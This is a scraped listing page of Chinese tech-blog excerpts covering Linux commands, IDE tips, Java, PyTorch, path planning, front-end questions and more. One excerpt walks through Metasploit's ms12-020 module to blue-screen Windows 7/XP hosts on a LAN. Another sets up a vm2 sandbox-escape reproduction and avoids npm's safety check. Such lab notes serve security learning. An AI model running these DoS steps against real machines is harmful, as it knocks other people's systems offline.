** * $description$ * @author 你的名字 * @date $date$ $time$ $params$ $return$ */ 步骤7点完之后还需要进行配置
其中，params中填入
groovyScript(" def result = ''; def params = \"${_1}\".replaceAll('[\\\\[|\\\\]|\\\\s]', '').split(',').toList(); for(i = 0; i &lt; params.size(); i++) {if(params[i] != '') result+='* @param '+ params[i] + ' ' +((i &lt; params.size() - 1) ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a8ef6b1b28c37c83507a2aa257c5a82/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c4769a56ca39821e8fd9024f8970088/" rel="bookmark">
			ps(1) command
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.命令简介2.命令格式3.选项说明3.1 简单的进程选择（SIMPLE PROCESS SELECTION）3.2 通过参数列表选择进程（PROCESS SELECTION BY LIST）3.3 输出格式控制（OUTPUT FORMAT CONTROL）3.4 输出修饰符（OUTPUT MODIFIERS）3.5 线程展示（THREAD DISPLAY） 4.常用示例5.拓展知识5.1 UID、RUID、EUID、SUID 的区别 参考文献 大咖好呀，我是恋喵大鲤鱼。 鄙人第二本开源书籍《后台开发命令365》上线啦，欢迎大家协同共建。
1.命令简介 ps（process status）命令用于报告当前进程快照。
ps 用于查看当前进程状态，查看的进程信息是当前的一个快照，如果想实时动态地查看进程信息，可以使用 top 命令。
ps 命令是最基本同时也是非常强大的进程查看命令，使用该命令可以查看进程的属主、进程ID、父进程ID、启动时间、占用 CPU 时长、启动命令、当前运行的状态等等，总之大部分信息都是可以通过执行该命令得到。ps 命令可以搭配 kill 命令随时终止不必要的进程。
ps 命令可接收多种类型的命令选项，主要有：
Unix 选项，可以分组，选项前面必须有一个连字符；BSD 选项，可以分组，不能与连字符一起使用；GNU long 选项，前面有两个连字符。 不同类型的选项可以自由混合，但可能会出现冲突。有一些同义的选项，它们在功能上是相同的。
默认情况下，ps 选择与当前用户具有相同有效用户 ID（EUID）且与调用者终端关联的所有进程。它显示进程 ID（PID）、与进程相关联的终端（TTY）、以 [DD-]hh:mm:ss 格式累积的 CPU 时间（TIME）和可执行文件名（CMD）。默认情况下输出不排序。
2.命令格式 ps [OPTIONS] 3.选项说明 3.1 简单的进程选择（SIMPLE PROCESS SELECTION） a 显示与终端关联的所有进程，包括其他用户的进程。一般与 x 选项联用，用于显示所有进程。 -A 选择所有进程，等同于 -e。 -a 选择除会话引导进程（参见 getsid(2)）和与终端无关的进程之外的所有进程。 -d 选择除会话引导进程外的所有进程。 --deselect 选择除满足指定条件进程之外的所有进程。等同于 -N。 -e 选择所有进程，等同于 -A。 -N 选择除满足指定条件进程之外的所有进程。等同于 --deselect T 选择与当前终端关联的所有进程。等同于没有参数的选项 t r 只显示运行状态的进程 x 显示 EUID（有效用户ID ）等同于 ps 命令的所有进程，包括与终端无关联的进程。一般与 a 选项联用，用于显示所有进程。 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8c4769a56ca39821e8fd9024f8970088/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/418f6cf004d46d7215fe27c51bee2ccc/" rel="bookmark">
			漏洞实现 --- Vm2沙箱逃逸漏洞复现(CVE-2023-32314)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vm2沙箱逃逸漏洞复现 CentOS7（Nodejs和vm@3.9.17）
PS：安装低版本npm是为了规避npm的内部审核机制（高版本npm会检查vm2安装包的安全性）
（1）流程 低版本nodejs + 低版本npm利用低版本npm安装vm@3.9.17升级至高版本nodejs复现漏洞 （2）开始操作 安装低版本nodejs + 低版本npm wget http://nodejs.org/dist/v0.10.25/node-v0.10.25.tar.gz --- 解压 mv node-v0.10.25-linux-x64 /usr/local/nodejs --- 更改名称 ./configure --prefix=/usr/local/nodejs --- 配置目录 make &amp;&amp; make install --- 编译安装 ln -s /usr/local/nodejs/bin/node /usr/local/bin --- 建立node软链接 ln -s /usr/local/nodejs/bin/npm /usr/local/bin --- 建立npm软链接 npm config set registry https://registry.npm.taobao.org --- 设置镜像源 npm config list --- 查看设置信息 查看版本
安装gcc
利用低版本npm安装vm2@3.9.17 npm install vm2@3.9.17 升级nodejs至高版本 安装nvm
配置环境变量，使得环境变量生效
nvm list-remote --- 查看版本 nvm install v16.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/418f6cf004d46d7215fe27c51bee2ccc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03f604778f4cf2a9162f12a09a5ecbda/" rel="bookmark">
			msf12-020蓝屏Windows7和XP系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 实验环境： kali linux 、同一个局域网 1、终端输入msfconsole 2、打开msfconsole渗透工具 3、使用search 搜索ms12-020该模块 举例：
msf 6 &gt;search ms12-020 4、选择第一个模块 msf 6&gt;use 1 5、设置蓝屏目标 用法：set rhost 蓝屏目标IP地址 举例： msf6auxiliary(dos/windows/rdp/ms12_020_maxchannelids) &gt; set rhost 192.168.0.213 6、输入run执行攻击： msf6auxiliary(dos/windows/rdp/ms12_020_maxchannelids) &gt; run 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a43941a1b80890d891dde956b1be98d/" rel="bookmark">
			不小心把pycharm菜单功能隐藏了，怎么重新打开解决方法！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 问题：不小心把菜单隐藏了，怎么都找不到解决办法! 一、连续点击两下shift键，弹出： 二、输入框输入"菜单两个字" 三、点击这个关闭按钮 点击开启后就看见工具栏啦！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d2c9d08c75f6c056f043cffa69b945a/" rel="bookmark">
			Linux学习笔记-Ubuntu系统下配置用户ssh只能访问git仓库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、基本信息1.1 系统信息1.2 git版本[^1]1.2.1 服务器端git版本1.2.2 客户端TortoiseGit版本1.2.3 客户端Git for windows版本 二、创建git用户和群组[^2]2.1 使用groupadd创建群组2.2 创建git用户2.2.1 使用useradd创建git用户2.2.2 配置新建的git用户ssh免密访问 2.3 创建git仓库文件夹2.4 切换到项目文件夹初始化git仓库 三、配置权限3.1 直接使用zero账户访问3.2 通过gpasswd设置git仓库权限3.3 设置git_user的权限3.4 禁止git_user通过ssh登录服务器 一、基本信息 1.1 系统信息 zero@ubuntu:~$ uname -a Linux ubuntu 5.15.0-79-generic #86-Ubuntu SMP Mon Jul 10 16:07:21 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 1.2 git版本1 1.2.1 服务器端git版本 zero@ubuntu:~$ git --version git version 2.34.1 1.2.2 客户端TortoiseGit版本 1.2.3 客户端Git for windows版本 $ git --version git version 2.38.1.windows.1 二、创建git用户和群组2 2.1 使用groupadd创建群组 zero@ubuntu:~$ sudo groupadd git	# 创建git群组 [sudo] password for zero: zero@ubuntu:~$ getent group git	# 查询git群组信息 git:x:1001: 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6d2c9d08c75f6c056f043cffa69b945a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e17098d9e812f2431ee0e3b3bd905e9/" rel="bookmark">
			linux-运维
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1. 在Linux中，可以使用以下命令查询服务器的CPU核心数和内存大小
2.在Linux上，可以使用以下命令查询磁盘大小
3.要查询Linux操作系统的信息，可以使用以下命令之一
4.linux-显示目录大小
5.linux-iotop
6.linux 批量删除
7.linux 跨机复制文件
8.linux find 9.linux 线程运行情况
10.linux 进程排序
11.linux 根据pid查询服务信息
12.linux 命令find
13.linux vi 命令翻页查询
14.linux vi 命令显示行号
15.linux 查看使用资源
16.linux 显示操作系统的发行版号
17.linux 显示系统名、节点名称、操作系统的发行版号、内核版本
18.linux 查询内存大小
1. 在Linux中，可以使用以下命令查询服务器的CPU核心数和内存大小 查询CPU核心数： cat /proc/cpuinfo | grep "processor" | wc -l 该命令会打印出CPU的信息，并通过管道符号（|）将结果传递给grep命令来过滤出包含"processor"的行，再使用wc -l命令来统计行数，即可得到CPU核心数。
查询内存大小： free -h | awk '/^Mem:/ {print $2}' 该命令会打印出内存的信息，并使用awk命令来匹配以"Mem:"开头的行，并打印出第二列的数值，即为内存大小。
执行以上命令后，即可得到服务器的CPU核心数和内存大小。
2.在Linux上，可以使用以下命令查询磁盘大小 df -h 该命令会显示文件系统的磁盘使用情况，包括磁盘大小、已使用和可用空间等信息。选项-h用于以人类可读的格式显示磁盘大小，即以K、M、G等单位显示。
如果只想查询某个具体的文件系统或挂载点的磁盘大小，可以在命令中添加具体的路径参数，例如：
df -h /dev/sda1 以上命令将只显示/dev/sda1文件系统的磁盘使用情况。
执行该命令后，即可得到磁盘的大小信息。
3.要查询Linux操作系统的信息，可以使用以下命令之一 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e17098d9e812f2431ee0e3b3bd905e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55983346dab545e754ae21a2d322122b/" rel="bookmark">
			Verdi的简单使用命令笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 通过flist查看代码结构
verdi -f 包含工程的file的list的文件（如flist.f） -top 工程的top-name &amp;
注1：“&amp;”的作用——允许在后台运行，即在命令之行窗口使用了ctrl+c后打开的verdi窗口也不会关闭
注2：“-top 工程的top-name”的作用——这样打开后工程目录结构是清晰干净的
注3：flist.f里的保存的都是各个工程文件的路径，可以是绝对路径，也可以是相对路径（写相对路径时一定要确定写对）
2 在verdi的波形文件中添加观察信号的方法：
方法1：可以在设计中选中想要观察的信号，直接拉到波形窗口中
方法2：在设计中选中想要观察的信号，使用ctrl+w添加信号到波形窗口中
3 查看波形常用的命令：
缩小波形：z（小写）
查看100%波形：f
4 保存波形文件
在波形窗口中：file——&gt;save signal/restore signal——&gt;选择保存为*.rc的文件
5 打开保存的波形文件
在波形窗口中：open图标——&gt;选择要打开的波形文件
6 用verdi打开覆盖率文件查看覆盖率
打开一个verdi——&gt;tools——&gt;coverage；在新打开的界面中选择——&gt;file——&gt;open/add database——&gt;选择相应的.vdb文件——&gt;more options——打开cov.hier文件
注：覆盖率文件为.vdb文件；.hier文件为对应工程目录的层级结构文件，对整理覆盖率有帮助
7 在Verdi波形文件中查找某个信号的某个值
dout（需要查找的信号）——&gt;鼠标右键——&gt;logical operation——&gt;==32'h值——&gt;create/modify——&gt;close
在波形文件中新增的logical_operation处的竖线处便是要查找的那个值
8 在verdi波形文件中统计某个信号出现的次数
找到要查看的信号——&gt;鼠标右键——&gt;add/remove——&gt;add conter signal by——&gt;rising edge / failing edge——&gt;enter键
9 Verdi中常用图标如下图所示
从左往右：D（driver）用于追踪信号的来源；L（load）用于追踪信号的下一级，即其输出给谁；向上的箭头用于查找在该.v文件中上一个相同信号的位置；向下的箭头用于查找在该.v文件中下一个相同信号出现的位置。
注1：四个操作都要在选中需要查找后的信号才能操作有效
注2：前两个图标操作涉及到同一个工程中不同的.v文件之间；后两个图标的操作只涉及到打开的.v文件。
10 显示有符号数的十进制有符号形式
在波形窗口中选中需要查看的信号，点击鼠标右键——&gt;Radix——&gt;Decimal——&gt;Notation——&gt;Signed 2's complement。
=========================以上为常用的操作=================================
11 在verdi中统计一个连续信号的个数
具体的操作可参见该链接Verdi使用技巧——连续有效信号量测方法 - 知乎 (zhihu.com)https://zhuanlan.zhihu.com/p/65779484如一个连续信号一个时钟周期会出现一次，则按照上链接的方法，如果A个时钟出现一个并且连续出现，则可以从链接中获得的数据除以A即可。
12 verdi的学习视频
链接1为：Verdi基础使用自学记录_哔哩哔哩_bilibilihttps://www.bilibili.com/video/BV11k4y1r7oZ?p=3这个视频有时间可以看看，初步接触者看第一遍可能有点懵，不过在工作中边用边看边学，还是有收获的。这个视频十分了多个小节来介绍的，总共时长在三小时左右。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/55983346dab545e754ae21a2d322122b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07dba3ffdede122747acf3d75dbd1f51/" rel="bookmark">
			JAVA学习之——九九乘法表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系列文章目录 九九乘法表简版解析
一、九九乘法表二、解析 一、九九乘法表 话不多说先上代码：
for(int i = 1; i &lt;= 9; i++) { for(int j = 1; j &lt;= i; j++) { System.out.print(j + "*" + i + "=" + (j * i) + " "); } System.out.println(); } 二、解析 for(int i = 1; i &lt;= 9; i++) {（外循环1—9）
for(int j = 1; j &lt;= i; j++) {（内循环1—（1—9）每次循环从1开始，到外循环变量i结束）
System.out.print(j + "*" + i + "=" + (j * i) + "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07dba3ffdede122747acf3d75dbd1f51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e761b81056912586a909e56b4fc8c4ab/" rel="bookmark">
			自己动手写数据输入并计算pytorch
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import torch from IPython import display from matplotlib import pyplot as plt import numpy as np import random num_inputs = 2 # （特征数）为2。 num_examples = 1000 # 训练数据集样本数为1000 true_w = [2, -3.4] # 线性回归模型真实权᯿ true_b = 4.2 # 偏差 torch.from_numpy是将 numpy 转成 tensor # loc(float)：此概率分布的均值（对应着整个分布的中心centre # scale(float)：此概率分布的标准差（对应于分布的宽度，scale越大，图形越矮胖；scale越小，图形越瘦高） # size(int or tuple of ints)：输出的shape，默认为None，只输出一个值 features = torch.from_numpy(np.random.normal(0, 1, (num_examples, num_inputs))).to(torch.float32) #生产1000个数据 labels = true_w[0] * features[:, 0] + true_w[1] * features[:, 1] + true_b #生成1000个labels labels += torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e761b81056912586a909e56b4fc8c4ab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/36bf174ae77a1fe4311337c845fb4d6f/" rel="bookmark">
			Hybrid_Astar算法原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、前言 Hybrid_astar是一种考虑机器运动学（转弯半径、车辆运动模型等）的非完整约束的全局路径规划算法，算法中主要实现了两大功能模块，第一是使用混合astar（2D(x+y)-astar + 3D(x+y+&amp;)-astar）搜索出一条起到到终点的考虑非完整约束的全局路径；第二是对产生的全局路径进行平滑，主要考虑四种平滑系数项（wSmoothness + wCurvature + wVoronoi + wObstacle），分别代表路径的平滑层度、路径的曲率层度、路径的居中层度、距离障碍物远近的层度。其主体还是在于路径规划，而路径规划的核心思想仍就是Astar，所有本文主要介绍规划部分，如果读者对Astar非常了解的话，那么Hybrid_astar的原理及源码就很简单了。
2、应用领域 APA（Auto Parking Asist，辅助泊车）、AVP（Automated Valet Parking，代客泊车）、U-Turn（行车场景下的车辆掉头）。其中AVP是目前较为热门的技术（用户在指定下客点下车，通过手机 APP下达泊车指令，车辆在接收到指令后可自动行驶到停车场的停车位，不需要用户操纵与监控，用车反之），旨在解决用户停车、用车最后一公里问题，属于低速自动驾驶技术，是能够实现商业落地的自动驾驶技术应用场景（如下图所示）。
3、算法流程 传统Astar搜索 和 考虑车辆运动约束搜索的区别：
Astar:只需要将搜索空间进行栅格化，然后按照栅格坐标去扩展路径，即只需要考虑X，Y；
考虑车辆运动约束搜索：需要考虑车辆的坐标（X,Y）、车头朝向（决定下一时刻可搜索方向）、转弯半径（决定可到达点）；
栅格化环境地图，用于空间搜索；初次更新起点到终点的启发代价值，使用三种方式进行预估（代码中其实只有实现两种），考虑车辆运动约束但不考虑障碍物的dubins曲线、考虑车辆运动约束但不考虑障碍物的reed_shepp曲线(可后退)、不考虑运动约束但考虑障碍物的传统Astar算法（其实是用Astar的G值来充当Hy_astar的H值），然后取三者的最大值作为Hybrid_astar的启发值，这样能够加速搜索。将起点加入到open_list表（一般使用优先队列或堆进行自动排序）中，然后进行循环扩展，搜索没有碰撞的子节点，并计算代价值G，将这些子节点加入到open_list表中，并将起点（当前节点）加入到close_list中。结束条件是open_list为空，或者搜索到终点，或者达到最大搜索次数。整体流程跟astar类似，流程如下：
4、核心代码实现与理解 下面可以通过截取的部分核心代码及注释更加详细的了解整个Hybrid_astar的过程。
#include "algorithm.h" #include &lt;boost/heap/binomial_heap.hpp&gt; using namespace HybridAStar; //原始A*算法，用来搜索计算 holonomic-with-obstacles heuristic float aStar(Node2D &amp;start, Node2D &amp;goal, Node2D *nodes2D, int width, int height, CollisionDetection &amp;configurationSpace, Visualize &amp;visualization); //计算start到目标点goal的启发式代价(即：cost-to-go) 会比较Astar、 dubins、 Reeds-Shepp void updateH(Node3D &amp;start, const Node3D &amp;goal, Node2D *nodes2D, float *dubinsLookup, int width, int height, CollisionDetection &amp;configurationSpace, Visualize &amp;visualization); // Dubins shot的路径 Node3D *dubinsShot(Node3D &amp;start, const Node3D &amp;goal, CollisionDetection &amp;configurationSpace); /** * 重载运算符，用来生成节点的比较 * “boost::heap::compare&lt;CompareNodes&gt;”获得使用 * 小顶堆 用于创建open_list(优先队列) */ struct CompareNodes { /// Sorting 3D nodes by increasing C value - the total estimated cost bool operator()(const Node3D *lhs, const Node3D *rhs) const { return lhs-&gt;getC() &gt; rhs-&gt;getC(); } /// Sorting 2D nodes by increasing C value - the total estimated cost bool operator()(const Node2D *lhs, const Node2D *rhs) const { return lhs-&gt;getC() &gt; rhs-&gt;getC(); } }; /** * 功能：Hybrid A* 的主调用函数 * 输入：起始点、目标点、配置空间的3维和2维表示（2D用来A*，3D用于hybrid A*）、搜索网格的宽度及高度、配置空间的查找表、Dubins查找表（程序实际上没有使用该表，而是直接调用OMPL库计算）、rviz可视化类(用于显示结果) * 输出：满足约束条件的节点（数据结构用指针表示） **/ Node3D *Algorithm::hybridAStar(Node3D &amp;start, const Node3D &amp;goal, Node3D *nodes3D, Node2D *nodes2D, int width, int height, CollisionDetection &amp;configurationSpace, float *dubinsLookup, Visualize &amp;visualization) { // 父节点 和 子节点的 index int iPred, iSucc; // 用于记录新扩展节点到起点的代价 float newG; // 可后退可前进6、只能前进3 int dir = Constants::reverse ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/36bf174ae77a1fe4311337c845fb4d6f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4037928d82343c89448d60dabd7f4c2e/" rel="bookmark">
			@Builder使用遇到的坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 问题现象问题分析解决方式延伸思考 问题现象 问题现象大概如下面示例，Account对象，有一个type属性，且设置了默认值为0，但由于使用了Builder方式构建，导致默认值丢失。
@Builder @Data @AllArgsConstructor @NoArgsConstructor public class Account { private Long id; private String name; private String type = "0"; } class Main { public static void main(String[] args) { Account account = Account.builder().name("Li").id(1L).build(); System.out.println(account); } } 输出内容
Account(id=1, name=Li, type=null) 问题分析 通过反编译可以看出，问题就在于build方法。
public static class AccountBuilder { private Long id; private String name; private String type; AccountBuilder() { } public Account.AccountBuilder id(Long id) { this.id = id; return this; } public Account.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4037928d82343c89448d60dabd7f4c2e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c8d1042beb8cfbafa5ee60daa95578c/" rel="bookmark">
			将数组中的每一项都转为字符串
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		const arr = [1, 2, 3, 4, 5]; const strArr = arr.map(item =&gt; String(item)); console.log(strArr); // 输出: ["1", "2", "3", "4", "5"] 在这个示例中，我们使用map()方法遍历数组arr中的每个元素，并使用箭头函数item =&gt; String(item)将每个元素转换为字符串。最后，我们将结果存储在strArr数组中。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8942fb5ff038ecb6a77b8beb119aa83/" rel="bookmark">
			PCL入门（五）：随机采样一致性算法RANSAC简单使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1. 简介2. 简单使用 1. 简介 参考博客《随机抽样一致性（RANSAC）算法详解》
该算法根据数据集获得满足一定条件的参数估计，实现利用尽可能少的数据获得尽可能大的一致性数据集。具体来说，
步骤1：从数据集中随机获得一定量的数据；步骤2：根据获取数据，做参数估计，并拟合模型；步骤3：计算数据集中的每一个点在该模型下的距离或者损失，据此将数据集分为内部点集合和外部点集合；步骤4：若迭代次数未超过阈值，则返回步骤1；步骤5：将内部点集合中数据最多的模型作为最终输出模型
2. 简单使用 给定一个球形点云，其中有部分噪声点云，希望对点云做处理，拿到球形点云，如下
主要参考双愚的代码
random_sample_consensus.cpp #include &lt;iostream&gt; #include &lt;pcl/console/parse.h&gt; #include &lt;pcl/filters/extract_indices.h&gt; #include &lt;pcl/io/pcd_io.h&gt; #include &lt;pcl/point_types.h&gt; #include &lt;pcl/sample_consensus/ransac.h&gt; #include &lt;pcl/sample_consensus/sac_model_plane.h&gt; #include &lt;pcl/sample_consensus/sac_model_sphere.h&gt; #include &lt;pcl/visualization/pcl_visualizer.h&gt; #include &lt;boost/thread/thread.hpp&gt; // 定义3d点云显示函数 boost::shared_ptr&lt;pcl::visualization::PCLVisualizer&gt; simpleVis (pcl::PointCloud&lt;pcl::PointXYZ&gt;::ConstPtr cloud) { boost::shared_ptr&lt;pcl::visualization::PCLVisualizer&gt; viewer (new pcl::visualization::PCLVisualizer("3D Viewer")); viewer-&gt;setBackgroundColor (0, 0, 0); viewer-&gt;addPointCloud&lt;pcl::PointXYZ&gt; (cloud, "sample cloud"); viewer-&gt;setPointCloudRenderingProperties(pcl::visualization::PCL_VISUALIZER_POINT_SIZE, 3, "sample cloud"); viewer-&gt;initCameraParameters(); return (viewer); } int main(int argc, char** argv) { // 步骤一：定义球形点云 pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr cloud(new pcl::PointCloud&lt;pcl::PointXYZ&gt;); pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr final_cloud (new pcl::PointCloud&lt;pcl::PointXYZ&gt;); cloud-&gt;width = 500; cloud-&gt;height = 1; cloud-&gt;is_dense = false; cloud-&gt;points.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a8942fb5ff038ecb6a77b8beb119aa83/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e75314de2ac1afb4ed7baffc7106412e/" rel="bookmark">
			uniapp之app开发选择本地文件上传至服务器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们知道uniapp在针对图片、视频这类文件有专门的API提供，这只是对于H5、小程序，而对于app而言，当选择文件特别是非图片等文件时似乎是力不从心。
最近的项目也是争对app android端关于文件上传时做了一下记录，希望对大家有所帮助
代码仍结合uniapp提供的uni.uploadFile()以及HTML5+开发者联盟所提供的技术实现，现记录一下实现过程中遇到的坑：
1、使用uni.request()，由于android端选择的文件通过不断的解析后是：/storage/emulated/0/Download/jiuguan0001.mp3 这种路径，因此uni.request()在解析时出错，不知道后端是如何处理这样的文件的
2、使用 new XMLHttpRequest() 测试发现文件存在跨域问题，找了很多方法仍然无果，决定放弃
3、使用uniapp插件市场提供的插件web-view，发现不够理想，修改后虽然可以用但达不到想要的效果
本文只是针对android 端其它端未测试，如有帮助可以参考
具体实现如下：
一、选择本地文件：（注意有的android机权限没有打开，需要打开权限，否则上传失败）
let that = this; let filePath = '' let url = uni.$u.http.config.baseURL // 根域名地址 let main = plus.android.runtimeMainActivity(); let Intent = plus.android.importClass('android.content.Intent'); let intent = new Intent(Intent.ACTION_GET_CONTENT); intent.setType('*/*'); intent.putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true); //关键！多选参数 intent.addCategory(Intent.CATEGORY_OPENABLE); main.startActivityForResult(intent, 200); // 获取回调 main.onActivityResult = function(requestCode, resultCode, data) { let Activity = plus.android.importClass('android.app.Activity'); let ContentUris = plus.android.importClass('android.content.ContentUris'); let Cursor = plus.android.importClass('android.database.Cursor'); let Uri = plus.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e75314de2ac1afb4ed7baffc7106412e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6fbeac2590fa6ab5be6d10762e55d348/" rel="bookmark">
			霍夫线变换，霍夫圆变换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载：
（四十八）通俗易懂理解——霍夫变换原理opencv —— HoughCircles 霍夫圆变换原理及圆检测【OpenCV入门教程之十四】OpenCV霍夫变换：霍夫线变换，霍夫圆变换合辑 理论上霍夫变换可以检测任意形状，但是复杂形状的霍夫空间过于庞大，导致实际上霍夫变换只能用于一些简单的形状。即使是对于椭圆，一般的霍夫变换也是无法检测的，下面给出一些检测椭圆的方法：
椭圆检测算法整理
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92ae18f812c90f6a4c54fde22a56c8d4/" rel="bookmark">
			【推荐几款实用的网盘资源搜索引擎】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、无为盘搜 - 聚合网盘搜索引擎
地址：https://wuweipansou.top
查看方式：直接打开
推荐指数：★★★★★
备注：聚合类，体验好，推荐！
1、云铺子 - 百度网盘搜索引擎
地址：http://www.yunpz1.net/
查看方式：直接打开
推荐指数：★★★★★
备注：聚合类，体验好，推荐！
2、橘子盘搜-好用的影视资源搜索引擎
地址：https://www.nmmeb.cc/
查看方式：直接打开
推荐指数：★★★★★
备注：专攻影视搜索，度盘、迅雷、阿里，体验好，推荐！
3、优聚搜
地址：https://ujusoo.com/
查看方式：直接打开
推荐指数：★★★★★
备注：支持度盘、蓝奏、阿里，体验好，推荐！
4、蓝瘦网盘在线搜索网页版
地址：http://www.sixyinn.com/disk-search
查看方式：直接打开
推荐指数：★★★★☆
备注：蓝奏云搜索，推荐！
5、懒盘搜索聚合官网
地址：https://lzpan.com/
查看方式：各种都有
推荐指数：★★★★☆
备注：聚合类，含16个搜索引擎
6、超能搜 - 百度网盘搜索神器
地址：http://www.chaonengso.com/
查看方式：各种都有
推荐指数：★★★★☆
备注：聚合类，含18个搜索引擎
8、万网搜 - 资源搜索聚合神器
地址：http://www.wanwangsou.com/
查看方式：各种都有
推荐指数：★★★★☆
备注：聚合类，含15个搜索引擎
9、云盘狗-百度云网盘搜索
地址：http://www.yunpangou.com/
查看方式：直接打开
推荐指数：★★★☆☆
10、学搜搜
地址：http://www.xuesousou.com/
查看方式：直接打开
推荐指数：★★★☆☆
备注：学习资源搜索
11、盘131 - 云盘资源搜索引擎
地址：https://www.pan131.com/
查看方式：直接打开
推荐指数：★★★☆☆
12、58网盘搜索
地址：https://www.58wangpan.com/
查看方式：直接打开
推荐指数：★★★☆☆
13、56网盘搜索
地址：https://www.56wangpan.net/
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/92ae18f812c90f6a4c54fde22a56c8d4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20546f01062481b8f34497fc9a559644/" rel="bookmark">
			前端面试合集（二）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前端面试题合集 1.懒加载的原理及实现了解吗2.如何理解JS异步3.阐述一下 JS 的事件循环4.JS 中的计时器能做到精确计时吗？为什么？ 1.懒加载的原理及实现了解吗 原理：当图片没有到达可视范围内时，图片不加载，当图片一旦进入可视范围，图片就会加载。先加载一部分数据进行页面展示，当触发了某个条件之后，会异步加载剩余的数据，且不会影响原有的数据，同时可以很大一部分减少服务器资源的消耗。
实现：
&lt;body&gt;	&lt;img data-src="../img/1.png" src="../img/loading.png" alt="xxx"&gt; &lt;img data-src="../img/2.jpg" src="../img/loading.png" alt="xxx"&gt; &lt;img data-src="../img/3.png" src="../img/loading.png" alt="xxx"&gt; &lt;img data-src="../img/4.jpeg" src="../img/loading.png" alt="xxx"&gt; &lt;img data-src="../img/5.png" src="../img/loading.png" alt="xxx"&gt; &lt;img data-src="../img/6.png" src="../img/loading.png" alt="xxx"&gt; &lt;img data-src="../img/7.png" src="../img/loading.png" alt="xxx"&gt; &lt;img data-src="../img/8.png" src="../img/loading.png" alt="xxx"&gt; &lt;img data-src="../img/9.png" src="../img/loading.png" alt="xxx"&gt; &lt;/body&gt; js实现：当offsetTop &lt;= scrollTop + clientHeight时，说明元素以及进入可视区，可以进行图片加载了
